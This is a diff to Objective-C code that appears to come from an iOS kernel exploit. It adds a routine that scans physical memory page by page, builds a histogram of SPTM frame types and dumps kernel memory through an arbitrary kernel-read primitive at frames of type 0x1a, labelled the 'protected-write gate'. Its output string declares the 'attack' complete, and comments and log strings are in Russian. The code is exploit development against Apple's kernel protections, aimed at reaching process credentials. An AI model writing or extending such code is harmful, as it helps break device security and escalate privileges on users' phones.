@@ -3099,7 +3099,36 @@ static NSString *kpFmtSptmFn(uint64_t raw)
             kpNote(r, @"  [C3] второго маппинга нет — ucred виден только через low-RAM PTE");
     }
 
-    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3] выше\n"];
+    // ---- N1 SCAN 2.0.89: type 0x1a frames (SPTM protected-write gate) ----
+    [r appendString:@"=== N1 2.0.89: hunt type 0x1a frames ===\n"];
+    {
+        uint64_t wB = kconstant(physBase), wS = kconstant(physSize);
+        uint32_t hist[64]; memset(hist, 0, sizeof(hist));
+        uint64_t hit1a[16]; int n1a = 0;
+        for (uint64_t pa = wB; pa < wB + wS; pa += 0x4000) {
+            int t = kpFrameTypeOf(pa);
+            if (t >= 0 && t < 64) hist[t]++;
+            if (t == 0x1a && n1a < 16) {
+                hit1a[n1a++] = pa;
+                uint64_t al = phystokv(pa);
+                NSMutableString *dd = [NSMutableString string];
+                if (al) {
+                    for (int i = 0; i < 4; i++)
+                        [dd appendFormat:@" %#018llx", (unsigned long long)early_kread64(al + i * 8)];
+                }
+                kpNote(r, [NSString stringWithFormat:@"  [N1] ★ type=0x1a pa=%#llx%@",
+                          (unsigned long long)pa, dd]);
+            }
+        }
+        // гистограмма только ненулевых
+        NSMutableString *hs = [NSMutableString string];
+        for (int i = 0; i < 64; i++) if (hist[i]) [hs appendFormat:@" 0x%x=%u", i, hist[i]];
+        kpNote(r, [NSString stringWithFormat:@"  [N1] type histogram:%@", hs]);
+        kpNote(r, [NSString stringWithFormat:@"  [N1] type-0x1a frames=%u", n1a]);
+        if (n1a == 0) kpNote(r, @"  [N1] кадров 0x1a нет — protected-write путь пуст");
+    }
+
+    [r appendString:@"[RESULT] АТАКА: завершена — см. строки [ATK]/[RPT]/[W501]/[SPTM]/[C3]/[N1] выше\n"];
     return r;
 
 }
